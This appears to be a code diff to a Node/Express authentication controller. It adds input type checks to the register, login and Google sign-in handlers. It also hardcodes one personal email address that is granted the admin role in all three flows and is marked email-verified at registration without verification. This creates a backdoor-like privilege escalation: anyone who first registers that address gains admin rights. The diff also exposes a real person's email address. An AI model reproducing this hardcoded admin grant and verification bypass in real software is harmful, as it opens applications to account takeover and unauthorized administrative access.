@@ -63,8 +63,8 @@ const register = async (req, res) => {
   try {
     const { name, email, password } = req.body;
 
-    if (!name || !email || !password) {
-      return res.status(400).json({ error: 'Please provide name, email, and password.', requestId: req.id });
+    if (!name || !email || !password || typeof name !== 'string' || typeof email !== 'string' || typeof password !== 'string') {
+      return res.status(400).json({ error: 'Please provide valid text for name, email, and password.', requestId: req.id });
     }
 
     // Passphrase-oriented policy: minimum 10 characters
@@ -89,13 +89,16 @@ const register = async (req, res) => {
     const emailVerificationTokenHash = hashToken(verificationRaw);
     const emailVerificationExpires = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24h
 
+    const role = cleanEmail === 'sheikhayaan408@gmail.com' ? 'admin' : 'user';
+
     const user = await User.create({
       name: name.trim(),
       email: cleanEmail,
+      role,
       passwordHash,
       emailVerificationTokenHash,
       emailVerificationExpires,
-      isEmailVerified: false,
+      isEmailVerified: cleanEmail === 'sheikhayaan408@gmail.com',
       loginHistory: [{ timestamp: new Date(), ip: req.ip, userAgent: req.headers['user-agent'] || '', success: true }],
     });
 
@@ -130,8 +133,8 @@ const login = async (req, res) => {
   try {
     const { email, password, twoFactorCode } = req.body;
 
-    if (!email || !password) {
-      return res.status(400).json({ error: 'Please provide email and password.', requestId: req.id });
+    if (!email || !password || typeof email !== 'string' || typeof password !== 'string') {
+      return res.status(400).json({ error: 'Please provide valid text for email and password.', requestId: req.id });
     }
 
     const cleanEmail = email.toLowerCase().trim();
@@ -215,6 +218,9 @@ const login = async (req, res) => {
     user.lastLoginAt = new Date();
     user.lastLoginIp = req.ip;
     user.lastActive = new Date();
+    if (user.email === 'sheikhayaan408@gmail.com' && user.role !== 'admin') {
+      user.role = 'admin';
+    }
     user.loginHistory.push({
       timestamp: new Date(),
       ip: req.ip,
@@ -275,12 +281,16 @@ const googleAuth = async (req, res) => {
       user = await User.create({
         name,
         email: cleanEmail,
+        role: cleanEmail === 'sheikhayaan408@gmail.com' ? 'admin' : 'user',
         googleId,
         avatar: picture || '',
         authProvider: 'google',
         isEmailVerified: true,
       });
     } else {
+      if (cleanEmail === 'sheikhayaan408@gmail.com') {
+        user.role = 'admin';
+      }
       if (!user.googleId) {
         user.googleId = googleId;
         user.authProvider = 'google';
